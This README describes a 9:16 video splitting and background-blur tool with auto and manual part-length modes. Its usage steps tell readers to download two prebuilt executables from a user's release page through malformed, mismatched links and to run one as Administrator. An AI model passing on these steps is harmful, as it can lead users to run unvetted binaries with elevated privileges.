# Video-Splitter
**A professional 9:16 video processing tool with intelligent multi-part splitting, background blur effects, and speed adjustment capabilities.**

## ✨ Features

### 🎯 **Core Functionality**
- **9:16 Aspect Ratio Processing**: Automatically crops and scales videos to 9:16 (1080x1920)
- **Background Blur Effect**: Creates beautiful blurred background with main video overlay
- **Speed Adjustment**: Adjust video playback speed from 0.5x to 2.0x
- **Intelligent Multi-Part Splitting**: Automatically splits long videos into optimal parts

### 🔧 **Advanced Processing**
- **Auto Mode**: Smart part duration calculation ensuring minimum 61s per part
- **Manual Mode**: Custom part duration with full user control
- **Quality Optimization**: Uses libx264 encoder for maximum compatibility
- **Real-time Preview**: Live part information display and calculation

### 🎨 **User Experience**
- **Modern Tkinter GUI**: Clean, intuitive interface with professional styling
- **Progress Tracking**: Real-time processing status and progress bar
- **Smart Controls**: Auto-lock during processing to prevent conflicts
- **Comprehensive Logging**: Detailed processing log with color-coded messages

- ## 📖 Usage Guide

### **1. Launch Application**
  a. **Download both files to the same folder:**
     - [Video.Splitter.exe]([https://github.com/GinaGina947/v1/releases/download/v1/Video.Splitter.exe](https://github.com/GinaGina947/Video-Splitter/releases/download/v1/Video.Splitter.exe)
     - [ffmpeg.exe]([https://github.com/GinaGina947/v1/releases/download/v1/ffmpeg.exe](https://github.com/GinaGina947/Video-Splitter/releases/download/v1/ffmpeg.exe))
  
  b. **Extract ffmpeg.exe** to the same folder as Video.Splitter.exe
  c. **Run Video.Splitter.exe** as Administrator
### **2. Select Input Video**
- Click "Browse" to select your MP4 video file
- Supported formats: MP4, AVI, MOV, MKV
- Video information will be automatically loaded and displayed

### **3. Configure Processing Options**
- **Speed**: Adjust from 0.5x to 2.0x (affects final duration)
- **Blur**: Set background blur strength (0-100)
- **Part Duration**: 
  - **Auto (0)**: Smart splitting with ≥61s per part
  - **Manual**: Custom duration (1-300s)

### **4. Process Video**
- Click "🎬 Process Video" to start processing
- All controls will be locked during processing
- Monitor progress in the real-time log

### **5. Access Output**
- Processed videos are saved in a subfolder named after the input file
- Click "📁 Output Folder" to open the results directory
- Each part is named: `Part 1 - [filename].mp4`, `Part 2 - [filename].mp4`, etc.

## 🎯 **Part Splitting Logic**

### **Auto Mode Intelligence**
- **< 90s**: Single part (no splitting)
- **90-200s**: 71s parts
- **200s-30min**: 131s parts  
- **30min-1hr**: 181s parts
- **> 1hr**: 241s parts
- **Guarantee**: Last part always ≥ 61s

### **Manual Mode Flexibility**
- Set any duration you prefer
- No restrictions on part lengths
- Warning displayed if last part < 61s

## 🔧 **Technical Details**

### **Video Processing Pipeline**
1. **Input Analysis**: Extract video properties (resolution, FPS, duration)
2. **Background Creation**: Scale and blur input video for background
3. **Main Video Processing**: Crop, scale, and position main content
4. **Overlay Composition**: Combine blurred background with main video
5. **Multi-Part Splitting**: Cut video into specified parts
6. **Encoding**: Use libx264 for maximum compatibility
